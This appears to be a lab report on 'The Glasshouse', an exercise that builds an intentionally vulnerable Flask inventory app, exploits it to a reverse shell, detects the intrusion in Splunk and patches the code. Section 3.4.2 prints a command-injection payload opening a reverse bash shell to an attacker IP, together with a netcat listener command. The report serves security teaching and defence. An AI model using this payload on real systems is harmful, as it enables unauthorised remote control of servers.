1.0 Introduction

1.1 Project Background and Motivation:

 Modern cybersecurity operations demand a holistic understanding of both offensive exploitation and defensive incident response "The Glasshouse" project simulates a real-world, full-spectrum cyber attack and defense lifecycle within a highly controlled laboratory environment.
 
 The primary motivation behind this simulation is to demonstrate the critical importance of system observability. 
By integrating a vulnerable web application with robust telemetry and a centralized Security Information and Event Management  solution, this project illustrates how rapid detection, containment, and code-level remediation are reliant on comprehensive architectural visibility. 

1.2 Objectives and Scope

The scope of this engagement encompasses the complete lifecycle of a cyber intrusion, from initial reconnaissance to final code-level patching. The primary objectives are: 
 
   •	To engineer and deploy a functional, intentionally vulnerable target application (" Inventory Management") with full SIEM logging capabilities. 
   
   •	To execute a Black Box penetration test, culminating in Remote Code Execution . 
   
   •	To reconstruct the exact attack timeline using forensic logs and perform immediate containment. 
   
   •	To apply secure coding principles to remediate the vulnerabilities and prove the efficacy of those patches against re-exploitation attempts. 

   
1.3 Lab Environment Summary

   The operational environment utilized a segmented, three-node virtual infrastructure. :
   
   VM1 served as the Target Machine, hosting the vulnerable Flask/Apache stack and the log forwarding agent. Kali
   
   VM2 functioned as the SIEM Machine, ingesting telemetry and executing detection logic. Kali  
   
   VM3 acted as the Attacker Machine, isolating the offensive tooling and exploitation frameworks used during the Red Team engagement. Kali





2.0 Architecture & Infrastructure

2.1 Lab Design Overview The laboratory environment consists of an isolated, host-only virtual network. The architecture separates the offensive workstation from the target environment and establishes a secure telemetry pipeline to a centralized Security Information and Event Management (SIEM) server. 

The web app server
<br/>
<img width="603" height="379" alt="image" src="https://github.com/user-attachments/assets/400223e9-a614-4f6d-baa2-5ad32aacc9fa" />

 
The attack machine 

 <img width="735" height="409" alt="image" src="https://github.com/user-attachments/assets/ebd296bc-8347-455a-8d4b-96d09062eb4c" />


The SIEM machine 

 <img width="800" height="482" alt="image" src="https://github.com/user-attachments/assets/35a9d94b-dbb6-4f8f-95f1-e9d53e599d7c" />


2.2 Virtual Machine Specifications Three independent Kali Linux virtual machines were provisioned and configured for specific operational roles: 
•	2.2.1 VM1 Target Machine: Configured as the victim server hosting the vulnerable web application and the log forwarding agent. 

•	2.2.2 VM2 SIEM Machine: Configured with extended storage to host Splunk Enterprise for log ingestion and defensive investigation. 

•	2.2.3 VM3 Attacker Machine: Configured as the offensive workstation isolating the exploitation frameworks. 


 <img width="975" height="286" alt="image" src="https://github.com/user-attachments/assets/64ba3be4-45d4-49e9-b79d-6a4674dd83bb" /> 


2.3 Vulnerable Web Application 2.3.1 Application Overview and Technology Stack: The " Inventory Management" application was developed using a Python/Flask backend and an SQLite3 database, served via an Apache2 web server. Four specific vulnerabilities were engineered into the application. 

2.3.2 Vulnerability 1: Unrestricted File Upload The file upload mechanism within the administrator portal lacks MIME-type validation and file extension blacklisting. The backend directly saves the user-provided filename to the static uploads directory. 

<img width="975" height="411" alt="image" src="https://github.com/user-attachments/assets/88971d51-39e9-4731-9d21-95fce1d98f81" />

 
2.3.3 Vulnerability 2: OS Command Injection The "Network Diagnostics" endpoint utilizes the subprocess.check_output() function with shell=True. It directly concatenates user input into the system ping command without sanitization. 

<img width="975" height="318" alt="image" src="https://github.com/user-attachments/assets/8979f2aa-a674-478d-a49f-1b188e2059d5" />

 
2.3.4 Vulnerability 3: Cross-Site Scripting (XSS) The public supplier contact form is vulnerable to Stored XSS. The backend inserts the raw user_message directly into the database. Furthermore, the frontend template explicitly bypasses HTML escaping by using the | safe Jinja filter. 

<img width="975" height="333" alt="image" src="https://github.com/user-attachments/assets/fb0c784f-22d6-4d80-8f72-714636e0c444" />


 2.4 Log Forwarding Setup
 2.4.1 Agent Configuration on VM1: The Splunk Universal Forwarder was installed on VM1. The agent was configured to connect to VM2 via TCP port 9997. 
 
2.4.2 Apache Log Ingestion: The forwarder was instructed to monitor /var/log/apache2/access.log. 

2.4.3 Bash History Capture: The forwarder was instructed to monitor the system authorization logs and bash execution history. 

 <img width="558" height="200" alt="image" src="https://github.com/user-attachments/assets/2f009672-3a67-4e75-8eeb-f6dacddeaa90" />
 <img width="523" height="234" alt="image" src="https://github.com/user-attachments/assets/a61e1201-935b-49b9-9861-c3cec82f1433" />


 
2.5 SIEM Deployment on VM2 2.5.1 Installation and Configuration: Splunk Enterprise was deployed on VM2. The receiving port was configured to listen on port 9997.

 2.5.2 Log Verification and Index Confirmation: Ingestion was verified prior to the engagement. Benign web requests and terminal commands executed on VM1 were successfully indexed and confirmed as searchable within the Splunk web interface. 

 <img width="944" height="424" alt="image" src="https://github.com/user-attachments/assets/877ed616-73c4-41df-aae1-03c2f7ae0467" />

 
2.6 Architecture Diagram 

<img width="868" height="535" alt="image" src="https://github.com/user-attachments/assets/2bcfcde1-19f4-4349-bec7-089d7a831770" />

 
Section 3: Penetration Testing Report

3.1 Engagement Overview
3.1.1 Scope and Rules of Engagement
The scope of this engagement was restricted to the vulnerable web application running on VM1 The primary objective was to perform a black-box penetration test to enumerate vulnerabilities, exploit them, and ultimately achieve Remote Code Execution (RCE) to obtain an interactive command shell on the target.

3.1.2 Methodology (Black Box)
The assessment followed a standard penetration testing methodology, encompassing Reconnaissance, Vulnerability Assessment, and Exploitation. As a black-box test, no source code was officially provided beforehand; vulnerabilities were discovered dynamically by interacting with the application.

3.1.3 Tools Used
Nmap: For initial port scanning and service discovery.
*Burp Suite: To intercept, modify, and analyze HTTP requests and responses.
Netcat: To catch the reverse shell connection.






3.2 Reconnaissance and Enumeration
The reconnaissance phase began with an Nmap TCP port scan against the target address. The scan successfully identified open ports for web services, specifically port 80 (HTTP) and port 443 (HTTPS).  

<img width="796" height="250" alt="image" src="https://github.com/user-attachments/assets/6df72d90-ced0-413d-bb4e-350a3e3792f3" />


To map the attack surface of the discovered web application, I utilized DirBuster to perform directory and file brute-forcing. This automated enumeration successfully uncovered a restricted administrative directory located at /admin.

<img width="635" height="399" alt="image" src="https://github.com/user-attachments/assets/9a894887-e12a-4155-9501-fd9347980ae7" />

 
Following this discovery, I navigated to the /admin/login portal and intercepted the authentication request using Burp Suite to bypass the login, I routed the captured request into Burp Suite Intruder and executed a dictionary attack against the password parameter by analyzing the HTTP response codes and lengths, I successfully identified valid credentials the payload password123 returned an HTTP 302 Found status redirecting to the /admin/dashboard, whereas incorrect attempts returned an HTTP 200 OK. 

<img width="558" height="284" alt="image" src="https://github.com/user-attachments/assets/dfadf018-08b9-4709-a721-558117adf5ec" />

 3.3 Vulnerability Assessment
 
3.3.1 Vulnerability 1: Stored Cross-Site Scripting 

Description: The message submission endpoint takes user input and stores it in the database without any input sanitization or output encoding.
Risk: High Allows an attacker to inject malicious JavaScript that will execute in the browser of any user who views the messages.
  
<img width="698" height="302" alt="image" src="https://github.com/user-attachments/assets/1d5f7f4e-e2ff-4c65-a2e9-efc94e41c718" />
<img width="704" height="251" alt="image" src="https://github.com/user-attachments/assets/370bd427-f594-4cba-80af-f3dedf3127aa" />



3.3.2 Vulnerability 2: Unrestricted File Upload
Description: The `/admin/upload` endpoint allows authenticated users to upload files to the `static/uploads` directory without validating the file extension or content.
Risk: Critical Allows an attacker to upload malicious executable scripts.

<img width="697" height="366" alt="image" src="https://github.com/user-attachments/assets/13fb1696-49d6-4dc5-ba5e-1f046c91e6fd" />

 
3.3.3 Vulnerability 3: OS Command Injection
Description: The Network Diagnostics (`/admin/ping`) endpoint takes an IP parameter via a POST request and passes it directly to the system's underlying shell without sanitizing shell metacharacters.
Risk: Critical Allows arbitrary system command execution with the privileges of the web application user.

<img width="544" height="394" alt="image" src="https://github.com/user-attachments/assets/32140bbd-604a-4d95-b9fe-38277ae6a78e" />

 
 3.4 Exploitation
3.4.1 Exploit Chain Walkthrough

1. Authentication: Using credentials discovered during the reconnaissance phase, I successfully authenticated to the `/admin/login` portal, granting access to the restricted administrative dashboard.
   
2. Command Injection Testing: I navigated to the Network Diagnostics utility I intercepted the ping request and appended system commands confirming the application was vulnerable to OS Command Injection by observing the directory listing in the terminal output.
   
3. Exploitation: With the vulnerability confirmed, I utilized the input field to inject a malicious bash payload designed to initiate a reverse TCP connection back to the attacker machine.
   
3.4.2 Webshell / Reverse Shell Delivery
A Netcat listener was established on the attacker machine (VM3) on port 4444 (nc -lvnp 4444) to trigger the reverse shell, the following payload was injected directly into the "IP Address to Ping" input field on the target web application:
`127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.120.142/4444 0>&1'`

<img width="456" height="363" alt="image" src="https://github.com/user-attachments/assets/00ae42b3-6aa4-4a70-a11c-7b1a2ceb82c1" />
<img width="474" height="234" alt="image" src="https://github.com/user-attachments/assets/0e452b73-809e-4bc4-b99e-68200bf24011" />


The payload successfully executed, causing the web application to hang while the underlying OS spawned an interactive bash session. The Netcat listener caught the incoming connection from the target machine. 
* Executing the `whoami` command confirmed the shell was operating with the privileges of the `www-data` user account.



3.6 Risk Rating Summary

Vulnerability	           |Severity	|Impact
OS Command Injection	    |Critical	|Complete system compromise via RCE.
Unrestricted File Upload	|Critical |	Complete system compromise via malicious file execution.
Stored XSS               |High	    |Session hijacking and administrative account takeover.


 3.7 Recommendations
 
OS Command Injection: Completely remove the use of `shell=True` in any `subprocess` calls Parameterize the command arguments securely, or use a dedicated Python library for network pinging rather than passing user input directly to the operating system shell.
Unrestricted File Upload: Implement a strict whitelist of allowed file extensions ensure files are saved without executable permissions and consider renaming them upon upload.
Stored XSS: Implement strict input sanitization before storing messages in the database. Ensure the framework automatically escapes HTML entities when rendering the dashboard.






4.0 Incident Response & Detection (Blue Team)

4.1 Investigation Methodology

 Following the identification of anomalous network activity within the "Glasshouse" environment, a formal incident response (IR) protocol was initiated. The investigation relied entirely on the centralized telemetry ingested by the Splunk Enterprise SIEM on Node 2. The primary objective was to reconstruct the adversary's attack chain, identify indicators of compromise (IoCs), eradicate persistent threats, and engineer robust detection logic to prevent future exploitatio
 
4.2 SIEM-Based Timeline Reconstruction

4.2.1 Apache Log Analysis

  <img width="618" height="291" alt="image" src="https://github.com/user-attachments/assets/e49a7375-f8af-4c66-81ef-4d80bb757505" />
  <img width="566" height="314" alt="image" src="https://github.com/user-attachments/assets/0ed16395-54aa-4268-a507-26e94a5090d8" />


4.2.2 Bash History Analysis

  <img width="975" height="467" alt="image" src="https://github.com/user-attachments/assets/2dd8f91e-828a-48e5-aa59-6e21eb810ea3" />


 ________________________________________
4.3 Containment and Remediation
4.3.1 SSH Access to Node 1 & 4.3.2 Artifact Identification and Deletion

<img width="670" height="513" alt="image" src="https://github.com/user-attachments/assets/3b3cff30-263d-4428-9f64-b7f7ae782cd4" />

 
4.3.3 Persistence Check

 <img width="975" height="497" alt="image" src="https://github.com/user-attachments/assets/b5d8ba97-9ee6-4c82-bfbf-3151ce4636ce" />

________________________________________
4.4 Detection Engineering

4.4.1 Query 1: Suspicious File Upload Detection
 
 <img width="975" height="451" alt="image" src="https://github.com/user-attachments/assets/468ae74a-f030-4c82-9408-dc62480e9862" />


4.4.2 Query 2: Cross-Site Scripting (XSS) Detection

 <img width="877" height="436" alt="image" src="https://github.com/user-attachments/assets/685d011d-72fd-47b6-b31f-c49682736d14" />
 <img width="803" height="363" alt="image" src="https://github.com/user-attachments/assets/172cc16a-c3dd-4e03-9c6f-e90e189ff081" />

 
4.4.3	Query 3: OS Command Injection Detection

<img width="795" height="374" alt="image" src="https://github.com/user-attachments/assets/e11d2693-735e-4ab2-ab92-74609e9bc34d" />

 
Section 5: Mitigation & Re-Exploitation
5.1 Version Control Setup
To properly track the remediation lifecycle and ensure a rollback mechanism, a local Git repository was initialized on the target web server before any source code modifications were made.

5.1.1 Git Repository Structure 
The repository was initialized in the root directory of the Flask application the structure contains the primary application script app.py, the SQLite database, and the static/uploads/ directory.

5.1.2 Initial Commit Vulnerable Baseline 
Before patching, the vulnerable version of the application was committed to establish the baseline. 

<img width="942" height="146" alt="image" src="https://github.com/user-attachments/assets/b933508f-6473-488c-b1b8-929d441925b0" />
<img width="915" height="148" alt="image" src="https://github.com/user-attachments/assets/082a730d-cf60-4c43-b625-76fd7e7c1acf" />

  
5.2 Code Remediation
Following the Penetration Testing report, the source code of app.py was modified to address the identified critical and high-severity vulnerabilities.


5.2.1 Fix for Vulnerability 1: OS Command Injection 
•	Remediation: The vulnerable shell=True argument was removed from the subprocess call a strict Regular Expression whitelist was implemented to ensure the user input perfectly matches an IPv4 format before execution, blocking all shell metacharacters.

  <img width="975" height="130" alt="image" src="https://github.com/user-attachments/assets/886cf678-19dc-46c2-a0fd-2fae345beba7" />
  <img width="975" height="107" alt="image" src="https://github.com/user-attachments/assets/f78d100e-cc84-48cb-91cb-13bd8ffc16d3" />


5.2.2 Fix for Vulnerability 2: Unrestricted File Upload (/admin/upload)
•	Remediation: Implemented a strict file extension whitelist allowing only non-executable formats additionally, the secure_filename() function from Werkzeug was added to strip any dangerous path-traversal characters from the uploaded filename.

<img width="975" height="39" alt="image" src="https://github.com/user-attachments/assets/e1d3ba9a-e31d-4229-b0f9-6ce21c633cf8" />
<img width="975" height="57" alt="image" src="https://github.com/user-attachments/assets/93438e8b-2cb2-4e68-b4cc-99c293ec205b" />
<img width="975" height="112" alt="image" src="https://github.com/user-attachments/assets/480ddaee-8c80-4e05-bc9e-512387b5435a" />



5.2.3 Fix for Vulnerability 3: Stored XSS (Contact Form)
•	Remediation: Python's html.escape() function was applied to all user input before it is inserted into the SQLite database. This sanitizes malicious HTML tags (e.g., converting <script> to &lt;script&gt;), rendering the payloads harmless when displayed on the admin dashboard.

<img width="867" height="59" alt="image" src="https://github.com/user-attachments/assets/2859ef53-533a-498a-a3e2-da9c4bddff9f" />
<img width="975" height="32" alt="image" src="https://github.com/user-attachments/assets/3c7271d8-a172-4a26-ad47-6f521f4c2c39" />

  
5.3 Patched Application Deployment

Once the code modifications were completed, the changes were staged and committed to the Git repository. The Flask application service was then restarted to apply the new secure configurations to the live environment.

5.4 Re-Exploitation Testing

To verify the effectiveness of the implemented patches, the offensive exploit chain utilized in Section 3 was repeated against the newly secured application.

5.4.1 Re-test Results Against PT Report Findings

•	Command Injection Re-test: The reverse shell payload (127.0.0.1; bash -c ...) was injected into the Network Diagnostics tool. The application immediately rejected the input, displaying the "SECURITY ALERT: Invalid IP Address format detected" error message.
•	File Upload Re-test: An attempt was made to upload a .py reverse shell script. The application successfully blocked the upload due to the extension whitelist.

•	XSS Re-test: The JavaScript fetch() payload was submitted to the contact form. Upon logging into the dashboard, the browser displayed the raw text of the script rather than executing it.


5.4.2 Confirmation of Patch Effectiveness 
All three vulnerabilities were successfully mitigated. The application is no longer susceptible to RCE, unauthorized file execution, or session manipulation via XSS. 

 <img width="611" height="322" alt="image" src="https://github.com/user-attachments/assets/2dba58b3-5d29-45c2-a9c8-cabde9cc845f" />
 <img width="624" height="256" alt="image" src="https://github.com/user-attachments/assets/4e3218d8-fa83-4f7f-a399-aec983ea3da3" />
 <img width="785" height="294" alt="image" src="https://github.com/user-attachments/assets/99690a79-3e4c-4126-b020-0503cfa3c2dc" />



  
5.6 Git Commit History SummaryThe remediation lifecycle is documented in the local version control history, providing an audit trail of the security patches. 

<img width="664" height="165" alt="image" src="https://github.com/user-attachments/assets/f6bf3e24-502e-497d-b5ff-9d6a3d658242" />

 
6.0 Strategic Conclusions
6.1 Project Summary 
"The Glasshouse" project successfully simulated a full-spectrum cyber adversary engagement within a controlled, observable laboratory environment. By engineering a custom web application ("Nexors Inventory Management") with intentional security flaws, the team was able to execute a complete Red/Blue team lifecycle. The simulation proved that while application vulnerabilities can lead to severe system compromise, a robust architectural foundation paired with centralized SIEM telemetry allows for rapid detection, containment, and permanent code-level remediation.
6.2 Key Findings Across All Roles 
The engagement yielded critical insights across all four operational domains:
•	Architecture & Visibility: The implementation of a dedicated telemetry pipeline (Splunk Universal Forwarder) proved essential. Total observability was achieved, ensuring no adversary action went unrecorded.
•	Offensive Operations (Red Team): The engagement highlighted the critical risk of unvalidated user input. The Red Team successfully achieved Remote Code Execution (RCE) by chaining an unrestricted file upload vulnerability with OS command injection.
•	Defensive Operations (Blue Team): The centralized SIEM (Splunk) allowed for accurate threat hunting. The Blue Team successfully reconstructed the attack timeline using Apache access logs and Bash history, executing immediate containment protocols to eradicate the webshell.
•	Mitigation & Validation (AppSec): Reactive containment is insufficient without proactive remediation. By applying secure coding practices—such as strict regex validation, HTML escaping, and file extension whitelisting—the vulnerabilities were permanently patched, and re-exploitation attempts were successfully neutralized.
6.3 Lessons Learned
The primary thing we learned is the patient even if u know everything some small details can make u slow and make the work cant move one one of things happened with us the machine have been crashed like 16 time and still we manage to fix it organizations must operate under an "assume breach" mentality. The engagement demonstrated that:
1.	Logging is the Foundation of Security: Without the telemetry pipeline established in Phase 1, the incident response team would have been entirely blind to the Red Team's lateral movement.
2.	Input Sanitization is Non-Negotiable: Every vulnerability exploited during this simulation (XSS, Command Injection, File Upload) stemmed from trusting user-supplied data.
3.	Cross-Functional Collaboration is Required: Security cannot exist in a silo. The success of this simulation relied on the seamless handover of intelligence from the Red Team's exploit reports to the Blue Team's detection engineers, and finally to the developers for code-level patching.
6.4 Future Improvements 
To further mature "The Glasshouse" architecture in future iterations, the following improvements are recommended:
•	Implementation of a Web Application Firewall (WAF): Deploying ModSecurity or a similar WAF to automatically block common SQLi and XSS payloads before they reach the Apache server.
•	Endpoint Detection and Response (EDR): Upgrading from basic log forwarding to an active EDR solution (e.g., Wazuh or CrowdStrike Falcon) to automatically kill malicious processes (like reverse shells) in real-time.
•	Automated SIEM Alerting: Transitioning the Splunk detection queries from manual threat hunting tools into automated alerts that trigger email or webhook notifications to the SOC team upon detecting Indicators of Compromise (IoCs).
